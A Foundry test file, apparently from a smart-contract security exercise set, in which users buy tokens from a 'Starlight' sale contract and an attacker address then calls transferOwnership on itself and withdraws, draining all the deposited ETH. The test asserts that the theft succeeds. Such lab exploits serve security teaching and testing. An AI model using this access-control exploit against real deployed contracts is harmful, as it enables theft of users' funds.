// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/access-control-4/Starlight.sol";

/**
@dev run "forge test --match-contract AC4" 
*/

contract TestAC4 is Test {
    Starlight starlight;

    uint128 public constant USER1_PURCHASE = 95 ether;
    uint128 public constant USER2_PURCHASE = 65 ether;
    uint128 public constant USER3_PURCHASE = 33 ether;

    uint256 init_attacker_bal;
    uint256 init_vault_bal;

    address deployer;
    address user1;
    address user2;
    address user3;
    address attacker;

    function setUp() public {
        deployer = address(1);
        user1 = address(2);
        user2 = address(3);
        user3 = address(4);
        attacker = address(5);

        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        vm.deal(user3, 100 ether);

        vm.prank(deployer);
        starlight = new Starlight();

        // Users buy starlight tokens
        vm.prank(user1);
        starlight.buyTokens{value: USER1_PURCHASE}(USER1_PURCHASE * 100, user1);
        vm.prank(user2);
        starlight.buyTokens{value: USER2_PURCHASE}(USER2_PURCHASE * 100, user1);
        vm.prank(user3);
        starlight.buyTokens{value: USER3_PURCHASE}(USER3_PURCHASE * 100, user1);
    }

    function test_Attack() public {
        console.log("[*] Exploit");

        vm.startPrank(attacker);
        starlight.transferOwnership(attacker);
        starlight.withdraw();
        vm.stopPrank();

        console.log("[+] Exploit Success");

        // Attacker stole all the ETH from the token sale contract
        assertEq(attacker.balance >= USER1_PURCHASE + USER2_PURCHASE + USER3_PURCHASE, true);
    }
}
